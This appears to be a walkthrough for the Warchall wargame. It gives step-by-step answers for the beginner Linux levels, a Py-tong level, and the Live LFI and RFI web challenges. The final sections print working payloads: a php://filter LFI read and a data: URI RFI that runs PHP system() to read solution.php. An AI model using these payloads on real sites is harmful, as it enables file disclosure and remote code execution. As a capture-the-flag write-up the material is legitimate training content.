# Warchall

## Warchall - The Beginning

Congratulations! You are now on your way to becoming a Linux superhacker.

Create an SSH account using the form below. Then enter the six solutions for levels 0-5, separated by commas.

Example: "bitwarrior, Solution1, Solution2, Solution3, Solution4, Solution5"

Connect to the our count ssh,using this commande
ssh -p 19198 pseudo@warchall.net
```bash
  ssh -p 19198 freddy@warchall.net
```

### Level0
1- Use the ls command to display the contents of the current folder:
ls 
```bash
  ls
```

2- Show the contents of the WELCOME.md file using cat WELCOME.md:
```bash
  cat WELCOME.md
```

3- Navigate to the directory containing the challenge mentioned in the WELCOME.md file:
```
  /home/level/ or /home/user/freddy/level
```

4- Open the 00_WELCOME directory using the cd command and read the README.md file to find the solution:
```bash
  cd 00_WELCOME
  cat README.md
```
### Level1
1- Open the 01_choice_tree directory using cd:
```bash
  cd O1_choice_tree
```
2- Search for the file containing the solution using the du command:
```bash
  du
```
3- Open the directory using cd and read the file containing the solution using cat:
```bash
  cd ./blue/hats/grey/solution
  cat SOLUTION.txt
```

### Level2
1- Open the 02 directory using cd:
```bash
  cd O2
```
2- Search for all files in this directory using du -b -a:
```bash
  du -b -a
```
3- Open the solution directory using cd and read the solution file using cat:
```bash
  cd ./porb
  cat ./.solution
```

### Level3
1- Open the 03 directory using cd:
```bash
  cd O3
```
2- Show all files in this directory using du -b -a:
```bash
  du -b -a
```
3- Read the file ./.bash_history using the cat command:
```bash
  cat ./.bash_history
```

### Level4
1- Open the 04_kwisatz directory using cd:
```bash
  cd 04_kwisatz
```
2- Show the contents of this directory using ls and read the README.nfo file using cat:
```bash
  cat README.nfo
```
3- Go to the home directory using cd:
```bash
  cd 
```
4- Show all contents of this directory using du:
```bash
  du -b -a
```
5- Read the file containing the solution using cat:
```bash
  cat ./level/04_kwisatz/README2.md
```
### Level5
1- Open the 05_privacy directory using cd:
```bash
  cd 05_privacy
```
2- Show the contents of this directory using ls:
```bash
  ls
```
3- Read the README.md file using cat:
```bash
  cat README.md 
```
## Py-tong
### Level12
To solve this challenge, the following command is used: ./pytong <(echo foo)

./pytong: This is the execution of the pytong binary, which is the Python script to exploit
<: This is the redirection operator; it takes the output of the following command and uses it as input for ./pytong.
(echo foo): This generates the string "foo" and passes it as input to ./pytong
```bash
./pytong <(echo foo)
```
## Live LFI
One reason why I wanted the warchall box is to offer more realistic webhacking challenges.
You may now try the Live LFI challenge that is hosted on it.

### Level14
Your objective is to retrieve the content of the `solution.php` file using LFI. Follow the steps below to complete the challenge.

Visit the following link in the web browser:
```
https://lfi.warchall.net/index.php?lang=solution.php
```
Try using the LFI vulnerability by appending the following payload to the URL:
```
[php://filter/convert.base64-encode/resource=solution.php](https://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php)
```
This payload utilizes the `php://filter` stream to encode the content of `solution.php` in base64.

Copy the encrypted base64-encoded text from the webpage and decode it using the following bash command in your terminal:
```bash
  echo "text_encrypted" | base64 -d
```

## Live RFI
https://rfi.warchall.net/index.php?lang=data:text/plain,%3C?php%20system(%22cat%20solution.php%22)?%3E.
